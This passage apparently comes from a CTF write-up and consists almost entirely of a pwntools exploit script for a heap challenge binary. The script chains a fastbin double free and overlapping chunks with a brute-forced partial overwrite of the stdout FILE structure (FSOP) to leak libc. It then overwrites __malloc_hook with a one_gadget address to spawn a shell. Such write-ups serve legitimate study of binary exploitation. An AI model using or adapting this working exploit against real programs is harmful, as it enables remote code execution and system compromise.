        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
brva 0x0000000000000CF4
brva 0x0000000000000D66
brva 0x0000000000000DAB
brva 0x0000000000000DCD

c
'''.format(**locals())

# ==================== EXPLOIT ====================

def cmd(idx):
    p.sendlineafter(b'You Choice:',str(idx).encode())

def add(size,data):
    cmd(1)
    p.sendlineafter(b'Size :',str(size).encode())
    p.sendafter(b'Data :',data)
def delete(idx):
    cmd(2)
    sla(b'Index :',str(idx).encode())
def init():
    global p

    p = start()

def exploit():

    while True:
        init()
        info(f'stdout: {hex(libc.sym._IO_2_1_stdout_)}')
        #input()
        add(0x68,b'f'*0x10 + p64(0) + p64(0x71))  # fake size chunk unsorted-bin
    #input("malloc2")
        add(0x68,b'a'*0x10 + p64(0) + p64(0x31) + b'a'*0x20 + p64(0) + p64(0x21))  # fake size next-chunk unsorted-bin
        # Double - free to create chunk chong cheo
    
        delete(0)
  
        delete(1)

        delete(0)
    
        add(0x68,b'\x20')   #  fake fd to chunk unsorted-bin
   
        add(0x68,b'\x00')   # nothing
   
        add(0x68,b'\x00')  # nothing
   
        add(0x68,b'\x00')  # chunk nay la chunk unsorted-bin
  
        delete(0)
   
        add(0x68,b'd'*0x10 + p64(0) + p64(0xa1))  # overwrite size chunk unsorted-bin
  
        delete(5)
    
        delete(0)
   
        delete(1)
        #input("change fd of chunk1 to stdout")
        add(0x78, p64(0) * 9 + p64(0x71) + b'\xa0')    # overwrite fd of chunk1 to chunk chua dia chi libc
    
        delete(7)
     
        sleep(0.33)
        add(0x68, p64(0) * 5 + p64(0x71) + p16(0x45dd))   # fake size cua chunk chua dia chi libc va overwrite fd to stdout-0x43
        sleep(0.33)
       
        add(0x68, b'A') # nothing
        # attack FSOP
        flags = 0xfbad1800
        padding = p64(0)*6 + b'a'*3
        payload = padding + p64(flags) + p64(0)*3 + b'\x88'
        # brute-force
        sleep(0.33)
        try:
            add(0x68,payload)
        except EOFError:
            continue
        test = p.recv(6)
        if test != b'*'*6:
            libc.address = u64(test.ljust(8,b'\x00')) - 0x3c38e0
            logbase()
            break
        else:
            p.close()
    malloc_hook = libc.address + 0x3c3b10
    info(f"malloc_hook: {hex(malloc_hook)}")
    og = [0x45216,0x4526a,0xef6c4,0xf0567]
    #input("double free again")
    log.info("double free again")
    delete(0)
    delete(1)
    delete(0)
    log.info(f"overwrite fd to malloc-hook")
    add(0x68,p64(malloc_hook-0x23))
    add(0x68,b'b')
    add(0x68,b'a')
    add(0x68,b'a'*19 + p64(og[2] + libc.address))
    input("trigger double free")
    # getshell
    delete(0)
    delete(0)
    p.interactive()

if __name__ == '__main__':
    exploit()
```

![image](https://hackmd.io/_uploads/S1-ca-h6yl.png)




